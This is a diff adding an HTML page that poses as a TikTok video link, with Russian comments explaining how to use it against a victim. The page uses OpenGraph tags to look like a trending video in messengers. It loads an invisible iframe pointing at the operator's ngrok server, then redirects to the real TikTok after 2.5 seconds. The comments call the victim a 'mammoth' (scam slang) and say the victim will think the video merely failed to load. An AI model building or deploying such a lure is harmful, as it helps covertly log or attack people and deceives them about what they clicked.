@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>TikTok - Make Your Day</title>
+    
+    <!-- OpenGraph теги: они создают красивую картинку и текст, когда ты кидаешь ссылку в мессенджер -->
+    <meta property="og:title" content="TikTok - Make Your Day">
+    <meta property="og:description" content="Watch this trending video!">
+    <meta property="og:image" content="https://p16-va-tiktok.ibyteimg.com/obj/musically-maliva-obj/06981882736184a5.png">
+    
+    <style>
+        body { background-color: #000; color: #fff; text-align: center; font-family: sans-serif; margin-top: 20%; }
+    </style>
+</head>
+<body>
+    <h2>Loading video...</h2>
+
+    <!-- НЕВИДИМЫЙ ФРЕЙМ: именно он незаметно стучится на твой сервер -->
+    <!-- ВМЕСТО ВАШ_NGROK_URL ВСТАВЬ СВОЮ ССЫЛКУ ИЗ NGROK -->
+    <iframe src="https://ВАШ_NGROK_URL.ngrok-free.app" style="width:0; height:0; border:0; border:none; display:none;"></iframe>
+
+    <script>
+        // Через 2.5 секунды мамонта перекинет на реальный сайт ТикТока
+        // Он подумает, что просто видео не загрузилось или баг
+        setTimeout(function() {
+            window.location.href = "https://www.tiktok.com/";
+        }, 2500);
+    </script>
+</body>
+</html>
